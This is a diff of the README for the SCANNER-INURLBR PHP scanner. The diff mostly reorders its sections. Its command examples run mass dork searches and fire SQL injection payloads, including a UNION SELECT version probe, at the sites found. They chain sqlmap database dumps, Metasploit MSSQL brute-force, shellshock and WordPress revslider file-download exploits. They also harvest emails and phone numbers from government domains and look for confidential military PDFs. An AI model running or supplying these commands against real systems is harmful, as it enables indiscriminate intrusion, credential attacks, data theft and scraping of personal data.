@@ -30,57 +30,6 @@ Codename: Facada
 Version:  3.0.0
 ```
 
-## Screenshots
-![Screenshot](https://1.bp.blogspot.com/-WswyqXamP44/YGYofFT6siI/AAAAAAAAAso/ea-3nf6OEqQxMw-dpEuIKedzwT7B5d0rwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-08-08.png)
-### Email extraction
-```bash
-php inurlbr.php  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
-```
-![Screenshot](https://1.bp.blogspot.com/-K_7F9nngSDk/YGYn30s1SHI/AAAAAAAAAsg/4k9NrPpBrognZ6kjx0WqeZo591X3nCydwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-01-03.png)
-
-### External Command
-```bash
-php inurlbr.php --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
-```
-![Screenshot](https://1.bp.blogspot.com/-dz8I8p2Aies/YGYr_yZ8x3I/AAAAAAAAAsw/cHq4KS8E6AwK7l66EsykqFgvWyXjtJqVACLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-18-39.png)
-
-### Filter Result Value
-```bash
-php inurlbr.php --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
-```
-![Screenshot](https://1.bp.blogspot.com/-vzZbwf_KobA/YGY8KQJCJwI/AAAAAAAAAs4/6jt1cse_4Goz3pfNeB1un4tmhRkKfnkVgCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B18-31-58.png)
-
-### Simple fuzz 
-```bash
-php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
-```
-![Screenshot](https://1.bp.blogspot.com/-bajxhdjFMbI/YGZaj1Cj9MI/AAAAAAAAAtA/Z3trH2lq3mEPcwtfoekdS7OanLfDrcZhQCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B20-41-09.png)
-
-### Parallel terminal ( popup )
-```bash
-php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
-```
-![Screenshot](https://1.bp.blogspot.com/-AFOmlAmYzUg/YGZgaNOY2II/AAAAAAAAAtI/twy2icF7kTo6N2YPKzOQojptIZYTCmbywCLcBGAsYHQ/s2057/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B21-05-40.png)
-
-
-### Extract urls using archive.org
-```bash
-php inurlbr.php  -o 'defense.gov.txt' --au -s 'defense.gov.out'
-```
-![Screenshot](https://1.bp.blogspot.com/-4RwLa0MyUqI/YG_KIpr1eII/AAAAAAAAAuo/iNwH0MMY-7I9AGDc9Z9OkmBMZ5ZNAEWwgCLcBGAsYHQ/s1104/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-15-33.png)
-
-### Extract values using regex
-```bash
-php inurlbr.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
-```
-![Screenshot](https://1.bp.blogspot.com/-CxspmhIyEh0/YG_LQKM8O1I/AAAAAAAAAu4/qgZ8dpiku1I9GGhQX-TyoPEQUdSNx2VRACLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-33-35.png)
-
-### Validate values using regex
-```bash
-php inurlbr.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
-```
-![Screenshot](https://1.bp.blogspot.com/-9YocowQy_-A/YG_Jodfsz6I/AAAAAAAAAug/D03Wz6GsFQsne0uozgA-Z_Kz8xNBrjB7gCLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-24-45.png)
-
 ## Lib & Permission
 ```properties
  ----------------------------------------------------------
@@ -102,6 +51,113 @@ Proxy random        TOR
  ----------------------------------------------------------
 resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 ```
+
+## Download
+Preferably, you can download inurlbr by cloning the [Git](https://github.com/MrCl0wnLab/SCANNER-INURLBR) repository:
+```properties
+git clone https://github.com/MrCl0wnLab/SCANNER-INURLBR.git inurlbr
+```
+The inurlbr works with [php](http://php.net/downloads.php) version **7.x**  linux platforms.
+
+## Giving permission to script execution
+```properties
+$chmod +x inurlbr.php
+Run: ./inurlbr.php
+```
+
+## Usage
+To get a list of basic options and switches use:
+```properties
+php inurlbr.php -h
+```
+To get a list of all options and switches use:
+```properties
+php inurlbr.php --help
+php inurlbr.php --info
+```
+
+## Setting your token ipinfo
+It is possible to register more than one token
+```bash
+./resources/token.ipinfo.inurl
+```
+## Setting your strings
+You can register more validation strings
+```bash
+./resources/strings.validation.inurl
+```
+
+## Setting your filter strings
+You can register more filter values that dirty your results
+```bash
+./resources/trash_list.validation.inurl
+```
+
+
+## Commands
+```properties
+./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
+   
+./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
+   
+./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+   
+./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
+   
+./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
+   
+./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
+  
+./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+   
+./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
+  
+./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
+   
+./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
+  
+./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
+  
+./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
+ 
+./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
+  
+./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
+  
+./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
+ 
+./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
+ 
+./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
+ 
+./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
+ 
+./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
+  
+./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
+ 
+./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
+  
+./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
+  
+./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
+  
+./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
+  
+./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+ 
+./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+ 
+./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
+ 
+./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
+ 
+./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
+ 
+./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
+```
+
+
 ## Help
 ```properties
 
@@ -545,114 +601,59 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
      Usage:   random(8)
      Usage:   --exploit-get 'user?id=random(8)'
 
-
 ```
 
-
-
-## Commands
-```properties
-./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
-   
-./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
-   
-./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
-   
-./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
-   
-./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
-   
-./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
-  
-./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
-   
-./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
-  
-./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
-   
-./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
-  
-./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
-  
-./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
- 
-./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
-  
-./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
-  
-./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
- 
-./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
- 
-./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
- 
-./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
- 
-./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
-  
-./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
- 
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
-  
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
-  
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
-  
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
-  
-./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
- 
-./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
- 
-./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
- 
-./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
- 
-./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
- 
-./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
-```
-
-## Installation
-Preferably, you can download inurlbr by cloning the [Git](https://github.com/MrCl0wnLab/SCANNER-INURLBR) repository:
-```properties
-git clone https://github.com/MrCl0wnLab/SCANNER-INURLBR.git inurlbr
-```
-The inurlbr works with [php](http://php.net/downloads.php) version **7.x**  linux platforms.
-
-## Giving permission to script execution
-```properties
-$chmod +x inurlbr.php
-Run: ./inurlbr.php
-```
-
-## Setting your token ipinfo
-It is possible to register more than one token
+## Screenshots
+![Screenshot](https://1.bp.blogspot.com/-WswyqXamP44/YGYofFT6siI/AAAAAAAAAso/ea-3nf6OEqQxMw-dpEuIKedzwT7B5d0rwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-08-08.png)
+### Email extraction
 ```bash
-./resources/token.ipinfo.inurl
+php inurlbr.php  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
 ```
-## Setting your strings
-You can register more validation strings
-```bash
-./resources/strings.validation.inurl
-```
+![Screenshot](https://1.bp.blogspot.com/-K_7F9nngSDk/YGYn30s1SHI/AAAAAAAAAsg/4k9NrPpBrognZ6kjx0WqeZo591X3nCydwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-01-03.png)
 
-## Setting your filter strings
-You can register more filter values that dirty your results
+### External Command
 ```bash
-./resources/trash_list.validation.inurl
+php inurlbr.php --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
 ```
+![Screenshot](https://1.bp.blogspot.com/-dz8I8p2Aies/YGYr_yZ8x3I/AAAAAAAAAsw/cHq4KS8E6AwK7l66EsykqFgvWyXjtJqVACLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-18-39.png)
 
-## Usage
-To get a list of basic options and switches use:
-```properties
-php inurlbr.php -h
+### Filter Result Value
+```bash
+php inurlbr.php --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
 ```
-To get a list of all options and switches use:
-```properties
-php inurlbr.php --help
-php inurlbr.php --info
+![Screenshot](https://1.bp.blogspot.com/-vzZbwf_KobA/YGY8KQJCJwI/AAAAAAAAAs4/6jt1cse_4Goz3pfNeB1un4tmhRkKfnkVgCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B18-31-58.png)
+
+### Simple fuzz 
+```bash
+php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
 ```
+![Screenshot](https://1.bp.blogspot.com/-bajxhdjFMbI/YGZaj1Cj9MI/AAAAAAAAAtA/Z3trH2lq3mEPcwtfoekdS7OanLfDrcZhQCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B20-41-09.png)
+
+### Parallel terminal ( popup )
+```bash
+php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
+```
+![Screenshot](https://1.bp.blogspot.com/-AFOmlAmYzUg/YGZgaNOY2II/AAAAAAAAAtI/twy2icF7kTo6N2YPKzOQojptIZYTCmbywCLcBGAsYHQ/s2057/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B21-05-40.png)
+
+
+### Extract urls using archive.org
+```bash
+php inurlbr.php  -o 'defense.gov.txt' --au -s 'defense.gov.out'
+```
+![Screenshot](https://1.bp.blogspot.com/-4RwLa0MyUqI/YG_KIpr1eII/AAAAAAAAAuo/iNwH0MMY-7I9AGDc9Z9OkmBMZ5ZNAEWwgCLcBGAsYHQ/s1104/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-15-33.png)
+
+### Extract values using regex
+```bash
+php inurlbr.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
+```
+![Screenshot](https://1.bp.blogspot.com/-CxspmhIyEh0/YG_LQKM8O1I/AAAAAAAAAu4/qgZ8dpiku1I9GGhQX-TyoPEQUdSNx2VRACLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-33-35.png)
+
+### Validate values using regex
+```bash
+php inurlbr.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
+```
+![Screenshot](https://1.bp.blogspot.com/-9YocowQy_-A/YG_Jodfsz6I/AAAAAAAAAug/D03Wz6GsFQsne0uozgA-Z_Kz8xNBrjB7gCLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-24-45.png)
+
 
 * Demos: [http://youtube.com/c/INURLBrasil](https://www.youtube.com/playlist?list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR)
 * Tutoriais: [http://blog.inurl.com.br/search/label/INURLBR](http://blog.inurl.com.br/search/label/INURLBR)
